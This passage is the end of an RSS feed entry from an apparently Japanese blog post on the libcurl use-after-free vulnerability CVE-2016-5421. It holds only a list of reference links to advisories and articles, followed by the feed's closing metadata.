  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-5421&amp;amp;l=oss-security&quot;&gt;oss-sec&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;section-7&quot;&gt;参考文献&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-004391.html&quot;&gt;JVNDB-2016-004391 libcurl における使用される接続を制御される脆弱性&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://curl.haxx.se/docs/adv_20160803C.html&quot;&gt;use of connection struct after free&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.slideshare.net/monochrojazz/use-after-free&quot;&gt;Use After Free 脆弱性攻撃を試す&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.atmarkit.co.jp/ait/articles/1409/22/news010.html&quot;&gt;Use After Freeとヒープスプレー&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Fri, 19 Aug 2016 18:00:00 +0900</pubDate>
        <link>https://kosukeshimofuji.jp/2016/08/19/CVE-2016-5421/</link>
        <guid isPermaLink="true">https://kosukeshimofuji.jp/2016/08/19/CVE-2016-5421/</guid>
        
        
        <category>vulnerability</category>
        
      </item>
    
  </channel>
</rss>
